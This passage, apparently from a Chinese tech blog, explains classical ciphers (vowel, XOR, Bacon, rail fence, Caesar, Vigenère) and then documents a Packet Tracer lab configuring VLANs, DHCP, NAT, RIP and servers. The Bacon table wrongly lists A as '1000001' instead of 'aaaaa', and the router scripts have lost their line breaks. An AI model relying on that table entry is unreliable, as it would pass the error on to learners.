align="center">L</th><th align="center">M</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">11</td><td align="center">12</td><td align="center">13</td><td align="center">2</td><td align="center">21</td><td align="center">22</td><td align="center">23</td><td align="center">3</td><td align="center">31</td><td align="center">32</td><td align="center">33</td><td align="center">34</td></tr><tr><td align="center"><strong>N</strong></td><td align="center"><strong>O</strong></td><td align="center"><strong>P</strong></td><td align="center"><strong>Q</strong></td><td align="center"><strong>R</strong></td><td align="center"><strong>S</strong></td><td align="center"><strong>T</strong></td><td align="center"><strong>U</strong></td><td align="center"><strong>V</strong></td><td align="center"><strong>W</strong></td><td align="center"><strong>X</strong></td><td align="center"><strong>Y</strong></td><td align="center"><strong>Z</strong></td></tr><tr><td align="center">35</td><td align="center">4</td><td align="center">41</td><td align="center">42</td><td align="center">43</td><td align="center">44</td><td align="center">45</td><td align="center">5</td><td align="center">51</td><td align="center">52</td><td align="center">53</td><td align="center">54</td><td align="center">55</td></tr></tbody></table><p><strong>eg：</strong></p><p>明文：I LOVE YOU</p><p>密文：3.33.4.51.2.54.4.5</p><p><strong>注：</strong></p><p>​        元音字母因为密文中只含有1，2，3，4，5五个数字而且时常出现个位数，因此很容易破解，有时候可以将1，2，3，4，5变为10，20，30，40，50等，也可变成如同棋盘密码密文的形式来对解密者进行干扰，如下表所示。</p><center>表 元音密码扩展密码表</center><table><thead><tr><th align="center">A</th><th align="center">B</th><th align="center">C</th><th align="center">D</th><th align="center">E</th><th align="center">F</th><th align="center">G</th><th align="center">H</th><th align="center">I</th><th align="center">J</th><th align="center">K</th><th align="center">L</th><th align="center">M</th></tr></thead><tbody><tr><td align="center">10</td><td align="center">11</td><td align="center">12</td><td align="center">13</td><td align="center">20</td><td align="center">21</td><td align="center">22</td><td align="center">23</td><td align="center">30</td><td align="center">31</td><td align="center">32</td><td align="center">33</td><td align="center">34</td></tr><tr><td align="center"><strong>N</strong></td><td align="center"><strong>O</strong></td><td align="center"><strong>P</strong></td><td align="center"><strong>Q</strong></td><td align="center"><strong>R</strong></td><td align="center"><strong>S</strong></td><td align="center"><strong>T</strong></td><td align="center"><strong>U</strong></td><td align="center"><strong>V</strong></td><td align="center"><strong>W</strong></td><td align="center"><strong>X</strong></td><td align="center"><strong>Y</strong></td><td align="center"><strong>Z</strong></td></tr><tr><td align="center">35</td><td align="center">40</td><td align="center">41</td><td align="center">42</td><td align="center">43</td><td align="center">44</td><td align="center">45</td><td align="center">50</td><td align="center">51</td><td align="center">52</td><td align="center">53</td><td align="center">54</td><td align="center">55</td></tr></tbody></table><p>则：</p><p>明文：I LOVE YOU</p><p>密文：3033405120544050</p><h2 id="费娜姆密码"><a href="#费娜姆密码" class="headerlink" title="费娜姆密码"></a>费娜姆密码</h2><p>​        费娜姆密码是一种二进制密码，使用七位二进制数代替字母，并使用异或操作对明文进行加密的方式。</p><p><strong>密码基础表</strong>：</p><center>表 字母对应的二进制表示</center><table><thead><tr><th align="center">字母</th><th align="center">二进制表示</th><th align="center">字母</th><th align="center">二进制表示</th></tr></thead><tbody><tr><td align="center">A</td><td align="center">1000001</td><td align="center">N</td><td align="center">1001110</td></tr><tr><td align="center">B</td><td align="center">1000010</td><td align="center">O</td><td align="center">1001111</td></tr><tr><td align="center">C</td><td align="center">1000011</td><td align="center">P</td><td align="center">1010000</td></tr><tr><td align="center">D</td><td align="center">1000100</td><td align="center">Q</td><td align="center">1010001</td></tr><tr><td align="center">E</td><td align="center">1000101</td><td align="center">R</td><td align="center">1010010</td></tr><tr><td align="center">F</td><td align="center">1000110</td><td align="center">S</td><td align="center">1010011</td></tr><tr><td align="center">G</td><td align="center">1000111</td><td align="center">T</td><td align="center">1010100</td></tr><tr><td align="center">H</td><td align="center">1001000</td><td align="center">U</td><td align="center">1010101</td></tr><tr><td align="center">I</td><td align="center">1001001</td><td align="center">V</td><td align="center">1010110</td></tr><tr><td align="center">J</td><td align="center">1001010</td><td align="center">W</td><td align="center">1010111</td></tr><tr><td align="center">K</td><td align="center">1001011</td><td align="center">X</td><td align="center">1011000</td></tr><tr><td align="center">L</td><td align="center">1001100</td><td align="center">Y</td><td align="center">1011001</td></tr><tr><td align="center">M</td><td align="center">1001101</td><td align="center">Z</td><td align="center">1011010</td></tr></tbody></table><p><strong>eg:</strong></p><p>明文：hello = H E L L O = 1001000 1000101 1001100 1001100 1001111</p><p>密钥：study = S T U D Y = 1010011 1010100 1010101 1000100 1011001</p><p>密文：10010001000101100110010011001001111 $$\oplus$$ 10100111010100101010110001001011001 </p><p>​        = 00110110010001001100100010000010110</p><p><strong>解密操作：</strong></p><ol><li>划分：即每七个数字为一组；</li><li>对应：找出密钥每个字母对应的数字，再与上述数字对应；</li><li>异或：将密文与密钥进行异或操作；</li><li>替换：将新得到一组数字在密码基础表中找到对应的字母，得出明文。</li></ol><h2 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h2><p>​        弗朗西斯·培根，英国人，他是第一个意识到科学技术能够改变世界面貌的哲学家。他不仅意思到这一点，而且积极投入科学技术的探索中。他对密码学的兴趣很浓厚，设计出的密码也丰富了密码学的内容。</p><p>​        他设计的密码非常独特，它可以不<strong>加过多的“雕饰”</strong>，几乎以<strong>本来的“素面”</strong>在你眼前晃过，而不会引起你的注意。</p><p>​        培根所使用的密码是一种<strong>本质上用二进制数设计</strong>的。不过，他没有用通常的0和1来表示，而是采用a和b，下面是他设计的26个英文字母二进制表示法。</p><center>表 培根密码表（5位）</center><table><thead><tr><th align="center">字母</th><th align="center">二进制表示</th><th align="center">字母</th><th align="center">二进制表示</th></tr></thead><tbody><tr><td align="center">A</td><td align="center">1000001</td><td align="center">N</td><td align="center">abbab</td></tr><tr><td align="center">B</td><td align="center">aaaab</td><td align="center">O</td><td align="center">abbba</td></tr><tr><td align="center">C</td><td align="center">aaaba</td><td align="center">P</td><td align="center">abbbb</td></tr><tr><td align="center">D</td><td align="center">aaabb</td><td align="center">Q</td><td align="center">baaaa</td></tr><tr><td align="center">E</td><td align="center">aabaa</td><td align="center">R</td><td align="center">baaab</td></tr><tr><td align="center">F</td><td align="center">aabab</td><td align="center">S</td><td align="center">baaba</td></tr><tr><td align="center">G</td><td align="center">aabba</td><td align="center">T</td><td align="center">baabb</td></tr><tr><td align="center">H</td><td align="center">aabbb</td><td align="center">U</td><td align="center">babaa</td></tr><tr><td align="center">I</td><td align="center">abaaa</td><td align="center">V</td><td align="center">babab</td></tr><tr><td align="center">J</td><td align="center">abaab</td><td align="center">W</td><td align="center">babba</td></tr><tr><td align="center">K</td><td align="center">ababa</td><td align="center">X</td><td align="center">babbb</td></tr><tr><td align="center">L</td><td align="center">ababb</td><td align="center">Y</td><td align="center">bbaaa</td></tr><tr><td align="center">M</td><td align="center">abbaa</td><td align="center">Z</td><td align="center">bbaab</td></tr></tbody></table><p><strong>eg：</strong></p><p>明文：OK</p><p>密文：abbbaababa</p><p><strong>培根密码扩展：</strong></p><p>​        任何只有两种状态的五位组合都可以看作是培根密码的衍生。如：</p><ul><li>正体字和斜体字</li><li>宋体与仿宋</li><li>黑体与微软雅黑</li><li>…</li></ul><h2 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h2><p>​        栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）</p><p><strong>二栏栅栏密码</strong>：</p><p><strong>加密</strong>：</p><ul><li>明文：THERE IS A CIPHER</li></ul><ol><li>明文格式化：THEREISACIPHER；</li><li>分组：TH ER EI SA CI PH ER；</li><li>提取：首字母组合：TEESCPE，尾字母组合：HRIAIHR；</li><li>拼接：TEESCPEHRIAIHR</li></ol><ul><li>密文：TEESCPEHRIAIHR</li></ul><p><strong>解密</strong>：</p><p>​        解密操作是加密的逆过程</p><p><strong>多栏栅栏密码</strong>：</p><p>​        多栏栅栏密码的解法与二栏栅栏密码相似，但有一个特点，<font color="red">栏数必须为总字符个数的公因子</font>。</p><p><strong>栅栏密码变种1：</strong></p><p>​        将所有汉字以其拼音表示，将各个拼音按<strong>声母</strong>和<strong>韵母</strong>进行分栏，按二栏栅栏密码进行加解密。</p><h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><p>​        凯撒密码(Caesar Cipher)或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换密码，其作为一种最为古老的对称加密体制，在古罗马的时候都已经很流行，他的基本思想是：通过<strong>把字母移动一定的位数</strong>来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。由此可见，<strong>位数</strong>就是凯撒密码加密和解密的密钥。</p><h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><p>​        <strong>维吉尼亚密码</strong>(Vigenere Cipher)，又译 <strong>维热纳尔密码</strong>，是使用一系列<strong>凯撒密码</strong>组成密码字母表的加密算法，属于<strong>多表密码</strong>的一种简单形式。其密码表如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CryptoDesc/VigenereCipherTable.png" alt="VigenereCipherTable"></center><p><strong>eg</strong>：</p><ul><li>明文(列)：TOBEO RNOTT OBETH ATIST HEQUE STION</li><li>密钥(行)：RELAT IONSR ELATI ONSRE LATIO NSREL</li><li>密文(点)：KSMEH ZBBLK SMEMP OGAJX SEJCS FLZSY</li></ul><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.33iq.com/group/628/3.html" target="_blank" rel="noopener">密码小组</a></p><p><a href="http://www.360doc.com/content/15/0222/14/21874787_450053353.shtml" target="_blank" rel="noopener">二进制密码(培根密码、费娜姆密码)</a></p><p><a href="https://blog.csdn.net/qq_34206560/article/details/83242664" target="_blank" rel="noopener">古典密码集合</a></p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Packet Tracer网络模拟实验实记</title>
      <link href="/2020/08/29/packet-tracer-wang-luo-mo-ni-shi-yan-shi-ji/"/>
      <url>/2020/08/29/packet-tracer-wang-luo-mo-ni-shi-yan-shi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/实验要求网络拓扑.png" alt="实验要求网络拓扑"></center><h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p><strong>分配的IP地址：</strong></p><ul><li><p>LAN1分配地址段为202.196.1.0/24，LAN1PC1和LAN1PC2属于vlan 10，LAN1PC3和LAN1PC4属于vlan 20</p></li><li><p>LAN2分配私有地址段:192.168.1.0/24</p></li><li><p>LAN3分配外部地址段:202.196.2.0/24</p></li></ul><p><strong>各个LAN配置要求：</strong> </p><ul><li>在LAN1中完成地址动态分配，LAN1PC1，LAN1PC2，LAN1PC3，LAN1PC4能够互相访问</li><li>在LAN2中完成NAT，使其中的计算机能够把地址转换成公网IP访问外面网络</li><li>在LAN3中配置LAN3Server服务器，为全网络提供Web服务，并配置DNS，网络中所有计算机可以通过域名访问该网站；配置FTP服务，全网计算机可使用该服务</li><li>路由器之间运行RIP协议生成动态路由</li><li>使LAN2中的计算机可以ping通外面的计算机，外面的计算机不能够ping通里面的机器，以达到保护LAN2中计算机不受外面攻击（实现方案不限）</li></ul><h1 id="技术分析"><a href="#技术分析" class="headerlink" title="技术分析"></a>技术分析</h1><ul><li>VLAN配置</li><li>VLAN间通信</li><li>DHCP配置</li><li>NAT技术</li><li>RIP路由配置</li><li>浮动路由配置</li><li>HTTP服务器配置</li><li>DNS服务器配置</li><li>FTP服务器配置</li></ul><h1 id="操作环境"><a href="#操作环境" class="headerlink" title="操作环境"></a>操作环境</h1><p>网络模拟器：</p><ul><li>Cisco Packet Tracer v7.0</li></ul><p>测试系统：</p><ul><li>Windows 10</li></ul><h1 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h1><ol><li><p>网络基础架构在Packet Tracer中复现，复现拓扑如图1所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/实验要求网络拓扑.png" alt="实验要求网络拓扑"></center><center>图1</center></li><li><p>IP地址分配及设备功能性标注，如图2所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/IP分配.png" alt="IP分配"></center><center>图2</center></li><li><p>在LAN1SW交换机中进行基于端口的VLAN配置操作，将LAN1PC1和LAN1PC2划分到VLAN10中，将LAN1PC3和LAN1PC4划分到VLAN20中，配置命令如图3所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN1SW1-VLAN配置.png" alt="LAN1SW1-VLAN配置"></center><center>图3</center></li><li><p>在R1路由器中配置DHCP服务，将202.196.1.2<del>202.196.1.127和202.196.1.130</del>202.196.1.254网段内的IP分别分配给VLAN10和VLAN20，配置命令如图4所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R1-DHCP配置.png" alt="R1-DHCP配置"></center><center>图4</center><p>DHCP服务配置完成之后LAN1PC1和LAN1PC3通过DHCP获得的IP分别为图5和图6所示。</p></li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN1PC1-DHCP-IP.png" alt="LAN1PC1-DHCP-IP"></center><center>图5</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN1PC3-DHCP-IP.png" alt="LAN1PC3-DHCP-IP"></center>   <center>图6</center><ol start="5"><li><p>在R1路由器的G0/0端口配置单臂路由，以实现VLAN10和VLAN20之间的通信，配置 命令如图7所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R1-单臂路由配置.png" alt="R1-单臂路由配置"></center><center>图7</center><p>单臂路由配置完成之后，LAN1PC1和LAN1PC3之间的连通性如图8所示。</p></li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN1PC1-ping-LAN1PC3(单臂路由结果).png" alt="LAN1PC1-ping-LAN1PC3(单臂路由结果)"></center><center>图8</center><ol start="6"><li><p>配置R1路由器端口的IP地址，配置命令如图9所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R1-IP配置.png" alt="R1-IP配置"></center><center>图9</center></li><li><p>配置R2路由器端口的IP地址，配置命令如图10所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R2-IP配置.png" alt="R2-IP配置"></center><center>图10</center></li><li><p>在R2路由器上进行基于端口的NAT配置，使LAN2中的主机可以访问Internet，配置命令如图11所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R2-NAT.png" alt="R2-NAT"></center><center>图11</center></li><li><p>配置R3路由器端口的IP地址，配置命令如图12所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R3-IP.png" alt="R3-IP"></center><center>图12</center></li><li><p>在LAN3Server上配置Web服务</p></li></ol><ul><li>开启HTTP服务如图13所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3Server-开启HTTP.png" alt="LAN3Server-开启HTTP"></center><center>图13</center><ul><li>编辑index.html页面如图14所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3Server-HTTP-index.png" alt="LAN3Server-HTTP-index"></center><center>图14</center><ul><li>在LAN3PC1主机上测试Web服务器配置结果如图15所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3PC1-IP-WebServer.png" alt="LAN3PC1-IP-WebServer"></center><center>图15</center><ol start="11"><li>在LAN3Server上配置DNS服务</li></ol><ul><li>开启DNS服务并为LAN3Server的HTTP服务配置一天记录，如图16所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3Server-DNS.png" alt="LAN3Server-DNS"></center><center>图16</center><ul><li>在LAN3PC1主机上测试DNS服务器的配置结果，如图17所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3PC1-DNS-WebServer.png" alt="LAN3PC1-DNS-WebServer"></center><center>图17</center><ol start="12"><li>在LAN3Server上配置FTP服务</li></ol><ul><li>开启FTP服务并添加一个FTP用户，如图18所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3Server-FTP.png" alt="LAN3Server-FTP"></center><center>图18</center><ul><li>在LAN3PC1主机上测试FTP服务的配置结果，如图19所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3PC1-FTP.png" alt="LAN3PC1-FTP"></center><center>图19</center><ol start="13"><li>RIP动态路由配置。</li></ol><ul><li>R1路由器的RIP配置命令如图20所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R1-RIP.png" alt="R1-RIP"></center><center>图20</center><ul><li>R2路由器的RIP配置命令如图21所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R2-RIP.png" alt="R2-RIP"></center><center>图21</center><ul><li>R3路由器的RIP配置命令如图22所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R3-RIP.png" alt="R3-RIP"></center><center>图22</center><ul><li>RIP配置完成之后LAN3PC2主机去pingLAN2PC1主机，测试结果如图23所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3PC2-ping-LAN2PC1.png" alt="LAN3PC2-ping-LAN2PC1"></center><center>图23</center><p><font color="red">LAN3内部主机可以ping通LAN2内部主机，在配置RIP时把私有IP当作共有IP来使用了，这个结果也不满足实验的要求，所以需要进行第14条操作。</font></p><ol start="14"><li>在R2路由器上配置浮动路由，在配置浮动路由之前需要把之前多余的RIP配置删除掉。</li></ol><ul><li>在R2上删除多余的RIP配置，操作命令如图24所示</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R2-Del-RIP.png" alt="R2-Del-RIP"></center><center>图24</center><ul><li>清除路由器的路由缓存，操作命令如图25所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R-ClearRouteCache.png" alt="R-ClearRouteCache"></center><center>图25</center><ul><li>在R2上配置浮动路由，配置命令如图26所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R2-IP-Route.png" alt="R2-IP-Route"></center><center>图26</center><h1 id="操作结果"><a href="#操作结果" class="headerlink" title="操作结果"></a>操作结果</h1><ul><li>LAN1PC2与LAN1PC4的连通性测试结果如图27所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN1PC2-ping-LAN1PC4.png" alt="LAN1PC2-ping-LAN1PC4"></center><center>图27</center><ul><li>LAN1PC2与LAN2PC1的连通性测试结果如图28所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN1PC2-ping-LAN2PC1.png" alt="LAN1PC2-ping-LAN2PC1"></center><center>图28</center><ul><li>LAN1PC2访问WebServer测试结果如图29所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN1PC2-WebServer.png" alt="LAN1PC2-WebServer"></center><center>图29</center><ul><li>LAN2PC1与LAN1PC1的连通性测试结果如图30所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN2PC1-ping-LAN1PPC1.png" alt="LAN2PC1-ping-LAN1PPC1"></center><center>图30</center><ul><li>LAN2PC1与LAN3PC 1的连通性测试结果如图31所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN2PC1-ping-LAN3PC1.png" alt="LAN2PC1-ping-LAN3PC1"></center><center>图31</center><ul><li>LAN2PC1到LAN3PC1的ping测试中，R2到R3时截获的ICMP报文如图32所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/R2-R3-ICMP.png" alt="R2-R3-ICMP"></center><center>图32</center><ul><li>LAN2PC1访问WebServer测试结果如图33所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN2PC1-WebServer.png" alt="LAN2PC1-WebServer"></center><center>图33</center><ul><li>LAN3PC1与LAN1PC3的连通性测试结果如图34所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3PC1-ping-LAN1PC3.png" alt="LAN3PC1-ping-LAN1PC3"></center><center>图34</center><ul><li>LAN3PC1与LAN2PC1的连通性测试结果如图35所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN3PC1-ping-LAN2PC1.png" alt="LAN3PC1-ping-LAN2PC1"></center><center>图35</center><ul><li>LAN1PC1访问FTPServer测试结果如图36所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN1PC1-FTPServer.png" alt="LAN1PC1-FTPServer"></center><center>图36</center><ul><li>LAN2PC4访问FTPServer测试结果如图37所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco/LAN2PC4-FTPServer.png" alt="LAN2PC4-FTPServer"></center><center>图37</center><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="配置命令脚本"><a href="#配置命令脚本" class="headerlink" title="配置命令脚本"></a>配置命令脚本</h2><p>LAN1部分配置：</p><ul><li><p>LAN1SW上的VLAN配置</p><pre class=" language-sql"><code class="language-sql">enconf thostname LAN1SWvlan <span class="token number">10</span>vlan <span class="token number">20</span><span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">10</span>switchport mode accessswitchport access vlan <span class="token number">10</span><span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">20</span>switchport mode accessswitchport access vlan <span class="token number">20</span><span class="token keyword">int</span> g0<span class="token operator">/</span><span class="token number">1</span>switchport mode trunkswitchport trunk allowed vlan <span class="token keyword">all</span><span class="token keyword">end</span></code></pre></li></ul><ul><li><p>R1上的DHCP配置</p><pre class=" language-sql"><code class="language-sql">enconf thostname R1ip dhcp excluded<span class="token operator">-</span>address <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">1.1</span> ip dhcp excluded<span class="token operator">-</span>address <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">1.129</span>ip dhcp pool vlan10 network <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">1.0</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.128</span><span class="token keyword">default</span><span class="token operator">-</span>router <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">1.1</span>dns<span class="token operator">-</span>server <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">2.250</span>exip dhcp pool vlan20network <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">1.128</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.128</span><span class="token keyword">default</span><span class="token operator">-</span>router <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">1.129</span> dns<span class="token operator">-</span>server <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">2.250</span><span class="token keyword">end</span></code></pre></li></ul><ul><li><p>R1上的单臂路由配置</p><pre class=" language-sql"><code class="language-sql">enconf t<span class="token keyword">int</span> g0<span class="token operator">/</span><span class="token number">0.1</span> encapsulation dot1Q <span class="token number">10</span>ip <span class="token keyword">add</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">1.1</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.128</span><span class="token keyword">int</span> g0<span class="token operator">/</span><span class="token number">0.2</span>encapsulation dot1Q <span class="token number">20</span>ip <span class="token keyword">add</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">1.129</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.128</span><span class="token keyword">int</span> g0<span class="token operator">/</span><span class="token number">0</span><span class="token keyword">no</span> shut<span class="token keyword">end</span></code></pre></li></ul><ul><li><p>R1其他端口IP配置</p><pre class=" language-sql"><code class="language-sql">enconf t<span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">0</span>ip <span class="token keyword">add</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">3.2</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span><span class="token keyword">no</span> shut<span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">1</span>ip <span class="token keyword">add</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">5.1</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span>clock rate <span class="token number">64000</span><span class="token keyword">no</span> shut<span class="token keyword">end</span></code></pre></li></ul><p>LAN2部分配置：</p><ul><li><p>R2上的IP配置</p><pre class=" language-sql"><code class="language-sql">enconf thostname R2<span class="token keyword">int</span> g0<span class="token operator">/</span><span class="token number">0</span>ip <span class="token keyword">add</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.1</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span><span class="token keyword">no</span> shut<span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">1</span>ip <span class="token keyword">add</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">5.2</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span><span class="token keyword">no</span> shut<span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">0</span>ip <span class="token keyword">add</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">4.2</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span><span class="token keyword">no</span> shut<span class="token keyword">end</span></code></pre></li></ul><ul><li><p>R2上的NAT配置</p><pre class=" language-sql"><code class="language-sql">enconf taccess<span class="token operator">-</span>list <span class="token number">1</span> permit <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.0</span> <span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">0.255</span> ip nat inside source list <span class="token number">1</span> <span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">0</span> overloadip nat inside source list <span class="token number">1</span> <span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">1</span> overload<span class="token keyword">int</span> g0<span class="token operator">/</span><span class="token number">0</span>ip nat inside<span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">0</span>ip nat outside<span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">1</span>ip nat outside<span class="token keyword">end</span></code></pre></li></ul><ul><li><p>R2上的浮动路由配置</p><pre class=" language-sql"><code class="language-sql">enconf tip route <span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">0.0</span> <span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">0.0</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">4.1</span>ip route <span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">0.0</span> <span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">0.0</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">5.1</span> <span class="token number">10</span><span class="token keyword">end</span></code></pre></li></ul><p>LAN3部分配置：</p><ul><li><p>R3上的IP配置</p><pre class=" language-sql"><code class="language-sql">enconf thostname R3<span class="token keyword">int</span> g0<span class="token operator">/</span><span class="token number">0</span>ip <span class="token keyword">add</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">2.1</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span><span class="token keyword">no</span> shut<span class="token keyword">int</span> s0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">0</span>ip <span class="token keyword">add</span> <span class="token number">202.196</span><span class="token punctuation">.</span><span class="token number">3.1</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span>clock rate <span class="token number">64000</span><span class="token 